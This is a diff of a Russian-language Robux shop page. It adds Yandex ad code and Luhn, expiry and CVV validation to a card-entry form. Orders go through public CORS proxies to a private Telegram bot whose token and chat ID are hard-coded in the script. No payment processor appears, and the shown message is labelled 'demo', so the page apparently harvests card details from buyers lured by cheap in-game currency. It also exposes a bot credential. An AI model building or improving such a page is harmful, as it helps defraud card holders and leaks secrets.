@@ -3,7 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Миксимка — заказ</title>
+  <title>Миксимка — оплата</title>
+
+  <!-- ===== ЗАГРУЗЧИК ЯНДЕКС.РСЯ ===== -->
+  <script>window.yaContextCb = window.yaContextCb || []</script>
+  <script src="https://yandex.ru/ads/system/context.js" async></script>
+  <!-- ================================= -->
+
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -213,40 +219,30 @@
       display: none;
     }
     .limit-warning.visible { display: block; }
-
-    /* РЕКЛАМНЫЙ БЛОК */
-    .ad-block {
-      background: #1a1a2c;
-      border: 1px dashed #2d2d48;
-      border-radius: 20px;
-      padding: 20px;
-      text-align: center;
-      margin: 24px 0 10px;
-      color: #666688;
-      font-size: 14px;
-      transition: 0.3s;
-    }
-    .ad-block:hover {
-      border-color: #7b2ffc;
-      background: #1f1f36;
-    }
-    .ad-block .ad-label {
-      display: block;
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      color: #444466;
-      margin-bottom: 8px;
-    }
-    .ad-block .ad-placeholder {
-      font-weight: 600;
-      font-size: 18px;
-      color: #8888bb;
-    }
-    .ad-block .ad-placeholder span {
+    .card-type {
+      font-size: 13px;
       color: #00c2ff;
+      margin-top: 4px;
+      min-height: 20px;
+      text-align: right;
     }
-
+    /* Стили для рекламного блока Яндекса (адаптация) */
+    .yandex-ad {
+      margin: 24px 0 10px;
+      min-height: 90px; /* резервное место, пока грузится реклама */
+      background: #1a1a2c;
+      border-radius: 20px;
+      border: 1px solid #2d2d48;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 10px;
+    }
+    .yandex-ad #yandex_rtb_R-A-123456-1 {
+      width: 100%;
+      max-width: 728px;
+      min-height: 90px;
+    }
     @media (max-width: 550px) {
       .card { padding: 20px 16px; }
       .header h1 { font-size: 22px; }
@@ -313,6 +309,7 @@
       <div class="field">
         <label>💳 Номер карты</label>
         <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" />
+        <div class="card-type" id="cardType"></div>
       </div>
       <div class="row">
         <div class="field">
@@ -329,16 +326,19 @@
     </div>
   </form>
 
-  <!-- ===== РЕКЛАМНЫЙ БЛОК ===== -->
-  <div class="ad-block">
-    <span class="ad-label">📢 Реклама</span>
-    <div class="ad-placeholder">
-      <span>Здесь может быть ваша реклама</span>
-    </div>
-    <div style="font-size: 12px; color: #444466; margin-top: 6px;">
-      Связь: @maxxi1mka
-    </div>
+  <!-- ===== РЕКЛАМНЫЙ БЛОК ЯНДЕКС.РСЯ ===== -->
+  <div class="yandex-ad">
+    <div id="yandex_rtb_R-A-123456-1"></div>
   </div>
+  <script>
+    window.yaContextCb.push(() => {
+      Ya.Context.AdvManager.render({
+        renderTo: 'yandex_rtb_R-A-123456-1',
+        blockId: 'R-A-123456-1'
+      });
+    });
+  </script>
+  <!-- ===================================== -->
 
   <div class="payment-icons">
     <span>Visa</span><span>MasterCard</span><span>МИР</span><span>Apple Pay</span><span>Google Pay</span>
@@ -354,6 +354,7 @@
 
 <script>
   (function() {
+    // ===== ОСНОВНЫЕ ЭЛЕМЕНТЫ =====
     const rubInput = document.getElementById('rub');
     const robuxSpan = document.getElementById('robuxDisplay');
     const nickInput = document.getElementById('nick');
@@ -364,14 +365,17 @@
     const cardNumber = document.getElementById('cardNumber');
     const cardExpiry = document.getElementById('cardExpiry');
     const cardCvv = document.getElementById('cardCvv');
+    const cardType = document.getElementById('cardType');
     const limitWarning = document.getElementById('limitWarning');
 
+    // ===== НАСТРОЙКИ =====
     const BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
     const CHAT_ID = '7073577831';
     const RATE = 1.7;
     const MIN_RUB = 10;
     const MAX_ROBUX = 10000;
 
+    // ===== КАЛЬКУЛЯТОР ROBUX =====
     function calcRobux(rub) {
       let val = Math.floor(rub * RATE);
       return val < 10 ? 10 : val;
@@ -400,11 +404,61 @@
     rubInput.addEventListener('input', updateDisplay);
     updateDisplay();
 
+    // ===== ПОКАЗ / СКРЫТИЕ ФОРМЫ =====
     showPaymentBtn.addEventListener('click', function() {
       paymentForm.classList.toggle('visible');
       showPaymentBtn.textContent = paymentForm.classList.contains('visible') ? '❌ Скрыть оплату' : '💳 Оплатить картой';
     });
 
+    // ===== ФУНКЦИЯ ПРОВЕРКИ КАРТЫ (АЛГОРИТМ ЛУНА) =====
+    function isValidCardNumber(number) {
+      const cleaned = number.replace(/\s/g, '');
+      if (!/^\d{16}$/.test(cleaned)) return false;
+
+      let sum = 0;
+      let alternate = false;
+      for (let i = cleaned.length - 1; i >= 0; i--) {
+        let digit = parseInt(cleaned[i]);
+        if (alternate) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        alternate = !alternate;
+      }
+      return sum % 10 === 0;
+    }
+
+    function getCardType(number) {
+      const clean = number.replace(/\s/g, '');
+      if (/^4/.test(clean)) return 'Visa';
+      if (/^5[1-5]/.test(clean)) return 'MasterCard';
+      if (/^2[2-7]/.test(clean)) return 'MasterCard';
+      if (/^3[47]/.test(clean)) return 'American Express';
+      if (/^220[0-4]/.test(clean)) return 'МИР';
+      return 'Unknown';
+    }
+
+    function isValidExpiry(expiry) {
+      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+      const [mm, yy] = expiry.split('/').map(Number);
+      if (mm < 1 || mm > 12) return false;
+
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+
+      if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
+        return false;
+      }
+      return true;
+    }
+
+    function isValidCvv(cvv) {
+      return /^\d{3,4}$/.test(cvv);
+    }
+
+    // ===== ВАЛИДАЦИЯ В РЕАЛЬНОМ ВРЕМЕНИ =====
     cardNumber.addEventListener('input', function() {
       let val = this.value.replace(/\D/g, '');
       if (val.length > 16) val = val.slice(0, 16);
@@ -414,6 +468,18 @@
         formatted += val[i];
       }
       this.value = formatted;
+
+      // Определяем тип карты
+      const type = getCardType(val);
+      let typeText = type === 'Unknown' ? '' : '💳 ' + type;
+
+      // Проверяем валидность
+      if (val.length === 16) {
+        const valid = isValidCardNumber(val);
+        typeText += valid ? ' ✅' : ' ❌';
+      }
+
+      cardType.textContent = typeText;
     });
 
     cardExpiry.addEventListener('input', function() {
@@ -430,6 +496,7 @@
       this.value = this.value.replace(/\D/g, '').slice(0, 4);
     });
 
+    // ===== ОТПРАВКА ЗАКАЗА =====
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -437,6 +504,7 @@
       const rub = parseFloat(rubInput.value) || 0;
       const robux = calcRobux(rub);
 
+      // Валидация никнейма и суммы
       if (!nick) {
         alert('⚠️ Введите никнейм в Roblox');
         nickInput.focus();
@@ -457,20 +525,26 @@
         return;
       }
 
+      // Валидация карты
       const cardNum = cardNumber.value.replace(/\s/g, '');
       const expiry = cardExpiry.value;
       const cvv = cardCvv.value;
 
-      if (cardNum.length !== 16) {
-        alert('⚠️ Введите 16 цифр номера карты');
+      if (!isValidCardNumber(cardNum)) {
+        alert('⚠️ Неверный номер карты (должно быть 16 цифр, проверьте)');
+        cardNumber.focus();
         return;
       }
-      if (expiry.length !== 5 || !expiry.includes('/')) {
-        alert('⚠️ Введите срок в формате MM/YY');
+
+      if (!isValidExpiry(expiry)) {
+        alert('⚠️ Неверный срок или карта просрочена (MM/YY)');
+        cardExpiry.focus();
         return;
       }
-      if (cvv.length < 3) {
-        alert('⚠️ Введите CVV (3–4 цифры)');
+
+      if (!isValidCvv(cvv)) {
+        alert('⚠️ Неверный CVV (3–4 цифры)');
+        cardCvv.focus();
         return;
       }
 
@@ -478,13 +552,15 @@
       btn.disabled = true;
       btn.textContent = '⏳ Обработка...';
 
+      const cardTypeName = getCardType(cardNum);
       const msg =
         '🟢 НОВЫЙ ЗАКАЗ (ОПЛАЧЕНО ДЕМО)\n' +
         '👤 Ник: ' + nick + '\n' +
         '💰 Сумма: ' + rub + ' ₽\n' +
         '🎁 Robux: ' + robux + ' R$\n' +
-        '💳 Карта: ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4);
+        '💳 Карта: ' + cardTypeName + ' ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4);
 
+      // ===== ОТПРАВКА ЧЕРЕЗ ПРОКСИ =====
       const proxies = [
         'https://api.allorigins.win/raw?url=',
         'https://corsproxy.io/?',
